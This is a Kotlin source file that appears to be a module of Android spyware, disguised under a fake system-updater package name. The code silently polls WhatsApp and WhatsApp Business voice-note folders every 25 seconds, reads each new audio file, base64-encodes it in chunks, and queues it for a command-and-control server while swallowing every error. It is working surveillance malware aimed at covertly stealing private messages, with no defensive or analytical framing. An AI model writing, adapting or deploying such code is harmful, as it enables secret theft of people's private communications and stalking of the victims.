package com.android.systemservice.updater

import android.content.Context
import android.util.Base64
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object VoiceNoteWatcher {

    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    private val seen = mutableSetOf<String>()

    private val DIRS = listOf(
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
        "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Voice Notes",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes",
    )

    fun start(ctx: Context) {
        scan(ctx)
        scheduler.scheduleWithFixedDelay({
            try { scan(ctx) } catch (_: Exception) {}
        }, 25, 25, TimeUnit.SECONDS)
    }

    private fun scan(ctx: Context) {
        for (p in DIRS) {
            val root = File(p)
            if (!root.exists() || !root.isDirectory) continue
            walk(ctx, root)
        }
    }

    private fun walk(ctx: Context, dir: File) {
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) { walk(ctx, f); continue }
            if (!f.isFile) continue

            val ext = f.extension.lowercase()
            if (ext !in listOf("opus", "m4a", "ogg", "aac", "mp3")) continue
            if (f.length() < 1024) continue

            val key = "${f.absolutePath}|${f.length()}|${f.lastModified()}"
            if (!seen.add(key)) continue

            upload(ctx, f)
        }
    }

    private fun upload(ctx: Context, file: File) {
        Thread {
            try {
                val bytes = file.readBytes()
                val total = bytes.size
                val uploadId = UUID.randomUUID().toString()
                val chunkSize = 200 * 1024

                var offset = 0
                while (offset < total) {
                    val end = minOf(offset + chunkSize, total)
                    val chunk = bytes.copyOfRange(offset, end)
                    val b64 = Base64.encodeToString(chunk, Base64.NO_WRAP)

                    val payload = JSONObject().apply {
                        put("type", "voice_chunk")
                        put("upload_id", uploadId)
                        put("name", file.name)
                        put("total", total)
                        put("offset", offset)
                        put("data", b64)
                        put("ts", System.currentTimeMillis())
                    }
                    C2Queue.enqueueUrgent(payload.toString())
                    offset = end
                }
            } catch (_: Exception) {}
        }.start()
    }
}
